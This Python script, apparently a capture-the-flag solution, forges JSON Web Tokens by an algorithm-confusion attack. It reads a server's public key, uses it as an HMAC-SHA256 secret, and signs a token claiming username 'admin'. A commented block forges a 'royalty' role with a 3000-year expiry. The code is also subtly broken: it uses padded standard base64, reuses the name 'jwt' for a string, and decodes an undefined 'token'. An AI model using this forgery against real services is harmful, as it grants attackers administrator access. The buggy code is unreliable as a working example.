import jwt
import datetime
with open('private_key.pem', 'rb') as f:
  PRIVATE_KEY = f.read()

with open('public_key.pub', 'rb') as f:
  PUBLICKEY = f.read()

# payload = {
#     "ROLE": "royalty",
#     "CURRENT_DATE": "03_07_1341_BC",
#     "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000))
# }
# token = jwt.encode(payload, PUBLICKEY, algorithm="HS256")

from codecs import encode, decode
import hmac
import hashlib

key = open('public_key.pub', 'rb').read()

header = b'{"typ":"JWT","alg":"HS256"}'
header = encode(header, 'base64').strip()
payload = b'{"username":"admin"}'
payload = encode(payload, 'base64').strip()
sig = hmac.new(key, header + b'.' + payload, hashlib.sha256).digest().strip()
sig = encode(sig, 'base64').strip()
jwt = '{}.{}.{}'.format(header.decode(), payload.decode(), sig.decode())

print(jwt)
t1 = "eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwNl8wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzY2MTg3Mn0.iOa9ZfJY1Z4Z8GDe0lEfH89-gtr1BWT58kuJTulUslG-MaHIagJ8NioAweQlMmuwvjRsjdpIUhpTF7WkgtlNCQ"
decoded = jwt.decode(
    token, PUBLICKEY, algorithms=jwt.algorithms.get_default_algorithms())
print(decoded)
